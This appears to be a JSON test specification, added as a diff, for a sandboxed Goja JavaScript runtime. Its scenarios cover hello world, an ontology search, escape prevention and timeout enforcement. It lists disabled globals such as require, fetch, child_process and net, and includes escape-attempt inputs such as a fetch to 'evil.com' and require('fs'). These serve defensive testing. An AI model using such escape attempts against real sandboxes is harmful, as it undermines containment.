@@ -1,0 +1,55 @@
+{
+  "story": "US-090",
+  "title": "Goja runtime integration test",
+  "description": "Proves the embedded Goja JavaScript runtime is usable and safe via four integration scenarios: hello world execution, ontology.search with a where clause against a real Bleve index, sandbox escape prevention (fetch/require blocked), and infinite-loop timeout enforcement (5s default).",
+  "fixture": {
+    "runtime": "pkg/functions.Runtime (backed by github.com/dop251/goja)",
+    "sandbox": {
+      "disabledGlobals": ["require", "fetch", "fs", "net", "process", "child_process", "os", "setTimeout", "setInterval", "setImmediate"],
+      "maxExecutionTime": "5s",
+      "maxMemoryBytes": "32MB",
+      "maxCallStackSize": 1024
+    },
+    "ontologyShim": {
+      "load": "ontology.load(objectType, primaryKey) -> JS object",
+      "search": "ontology.search(objectType, whereClause, opts?) -> { data: [...], totalCount }"
+    }
+  },
+  "scenarios": [
+    {
+      "name": "hello_world",
+      "source": "function main() { return \"Hello, World!\"; }",
+      "expected": { "result": "Hello, World!" }
+    },
+    {
+      "name": "findOrdersOver",
+      "source": "function main(input) { var r = ontology.search(\"order\", {type:\"gt\",field:\"amount\",value:1000}); var ids=[]; for(var i=0;i<r.data.length;i++){ids.push(r.data[i].orderId);} return ids; }",
+      "setup": "5 orders indexed in Bleve: ORD-001(500), ORD-002(1500), ORD-003(2000), ORD-004(300), ORD-005(3000)",
+      "expected": { "result": ["ORD-002", "ORD-003", "ORD-005"] }
+    },
+    {
+      "name": "sandbox_escape_fetch",
+      "source": "function main() { return fetch(\"http://evil.com\"); }",
+      "expected": { "error": "fetch is not defined or not a function" }
+    },
+    {
+      "name": "sandbox_escape_require",
+      "source": "function main() { return require(\"fs\"); }",
+      "expected": { "error": "require is not defined or not a function" }
+    },
+    {
+      "name": "timeout_while_true",
+      "source": "function main() { while(true) {} }",
+      "expected": { "error": "execution timeout exceeded", "maxElapsed": "10s" }
+    }
+  ],
+  "coveredBy": [
+    "test/integration/goja_runtime_test.go::TestGojaRuntime_Integration"
+  ],
+  "notes": [
+    "Function source is stored in PostgreSQL (functions table, migration 000021) and retrieved by name before execution.",
+    "The ossOntologyClient adapter bridges oss.Service to the functions.OntologyClient interface by pre-binding ontologyRID.",
+    "Dangerous globals are double-deleted: set to Undefined then Delete from globalObject.",
+    "Memory watchdog polls every 50ms; timeout uses context cancellation + vm.Interrupt."
+  ]
+}
